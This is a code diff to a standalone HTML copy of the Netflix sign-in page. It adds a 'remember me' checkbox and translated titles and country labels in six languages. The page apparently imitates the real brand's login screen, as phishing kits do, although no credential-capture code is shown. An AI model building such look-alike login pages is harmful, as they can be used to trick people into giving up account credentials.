@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix France - Regardez des séries et films en streaming</title>
+    <title id="pageTitle">Netflix France - Regardez des séries et films en streaming</title>
     <style>
         * {
             margin: 0;
@@ -76,63 +76,6 @@
             flex: 1;
             display: flex;
             flex-direction: column;
-        }
-
-        /* Login Container */
-        .login-container {
-            max-width: 450px;
-            width: 90%;
-            margin: 2rem auto;
-            padding: 3rem;
-            background-color: rgba(0, 0, 0, 0.75);
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-
-        @media (max-width: 740px) {
-            .login-container {
-                width: 85%;
-                padding: 2rem;
-                margin: 1.5rem auto;
-            }
-        }
-
-        /* ... (autres styles restent identiques) ... */
-
-        /* Footer - NOUVELLE VERSION */
-        .footer {
-            background: rgba(0, 0, 0, 0.75);
-            padding: 30px 15% 60px;
-            color: #737373;
-            font-size: 13px;
-            margin-top: auto; /* Ceci pousse le footer vers le bas */
-            width: 100%;
-        }
-
-        .footer-content {
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-
-        @media (max-width: 800px) {
-            .footer {
-                padding: 30px 5% 40px;
-            }
-        }
-
-        .language-selector {
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 7px 30px 7px 12px;
-            border: 1px solid #777;
-            border-radius: 3px;
-            font-size: 14px;
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 8px center;
-            background-size: 12px;
         }
 
         /* Login Container */
@@ -387,7 +330,11 @@
                     <div class="spinner"></div>
                 </button>
                 <div class="options-container">
-                 <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" class="remember-checkbox">
+                        <label for="remember" id="rememberLabel">Se souvenir de moi</label>
+                    </div>
+                    <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
                 </div>
             </form>
             <div class="signup-text">
@@ -412,14 +359,15 @@
                 <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
                 <a href="#" class="footer-link" id="adsLink">Choix liés à la pub</a>
             </div>
-            <div>Netflix France</div>
+            <div id="countryText">Netflix France</div>
         </div>
     </footer>
 
     <script>
-        // Traductions multilingues
+        // Traductions multilingues complètes
         const translations = {
             fr: {
+                pageTitle: "Netflix France - Regardez des séries et films en streaming",
                 loginTitle: "S'identifier",
                 emailLabel: "E-mail ou numéro de téléphone",
                 passwordLabel: "Mot de passe",
@@ -435,9 +383,11 @@
                 privacyLink: "Confidentialité",
                 cookiesLink: "Préférences de cookies",
                 legalLink: "Mentions légales",
-                adsLink: "Choix liés à la pub"
+                adsLink: "Choix liés à la pub",
+                countryText: "Netflix France"
             },
             en: {
+                pageTitle: "Netflix - Watch TV Shows Online, Watch Movies Online",
                 loginTitle: "Sign In",
                 emailLabel: "Email or phone number",
                 passwordLabel: "Password",
@@ -453,9 +403,11 @@
                 privacyLink: "Privacy",
                 cookiesLink: "Cookie Preferences",
                 legalLink: "Legal Notices",
-                adsLink: "Ad Choices"
+                adsLink: "Ad Choices",
+                countryText: "Netflix United States"
             },
             es: {
+                pageTitle: "Netflix España - Ver series y películas en streaming",
                 loginTitle: "Iniciar sesión",
                 emailLabel: "Correo electrónico o número de teléfono",
                 passwordLabel: "Contraseña",
@@ -471,9 +423,11 @@
                 privacyLink: "Privacidad",
                 cookiesLink: "Preferencias de cookies",
                 legalLink: "Avisos legales",
-                adsLink: "Opciones de anuncios"
+                adsLink: "Opciones de anuncios",
+                countryText: "Netflix España"
             },
             de: {
+                pageTitle: "Netflix Deutschland - Serien und Filme online ansehen",
                 loginTitle: "Anmelden",
                 emailLabel: "E-Mail oder Telefonnummer",
                 passwordLabel: "Passwort",
@@ -489,9 +443,11 @@
                 privacyLink: "Datenschutz",
                 cookiesLink: "Cookie-Einstellungen",
                 legalLink: "Rechtliche Hinweise",
-                adsLink: "Werbepräferenzen"
+                adsLink: "Werbepräferenzen",
+                countryText: "Netflix Deutschland"
             },
             ru: {
+                pageTitle: "Netflix Россия - Смотрите сериалы и фильмы онлайн",
                 loginTitle: "Войти",
                 emailLabel: "Электронная почта или номер телефона",
                 passwordLabel: "Пароль",
@@ -507,9 +463,11 @@
                 privacyLink: "Конфиденциальность",
                 cookiesLink: "Настройки файлов cookie",
                 legalLink: "Юридические уведомления",
-                adsLink: "Настройки рекламы"
+                adsLink: "Настройки рекламы",
+                countryText: "Netflix Россия"
             },
             pl: {
+                pageTitle: "Netflix Polska - Oglądaj seriale i filmy online",
                 loginTitle: "Zaloguj się",
                 emailLabel: "Adres e-mail lub numer telefonu",
                 passwordLabel: "Hasło",
@@ -525,7 +483,8 @@
                 privacyLink: "Prywatność",
                 cookiesLink: "Preferencje dotyczące plików cookie",
                 legalLink: "Informacje prawne",
-                adsLink: "Ustawienia reklam"
+                adsLink: "Ustawienia reklam",
+                countryText: "Netflix Polska"
             }
         };
 
@@ -544,14 +503,13 @@
                     element.textContent = value;
                 }
             }
+            document.title = trans.pageTitle;
         }
 
         // Initialiser la langue au chargement
-        const savedLang = localStorage.getItem('netflixLang');
-        if (savedLang) {
-            document.getElementById('languageSelector').value = savedLang;
-            updateLanguage(savedLang);
-        }
+        const savedLang = localStorage.getItem('netflixLang') || 'fr';
+        document.getElementById('languageSelector').value = savedLang;
+        updateLanguage(savedLang);
 
         // Gestion du formulaire
         document.getElementById('loginForm').addEventListener('submit', function(e) {
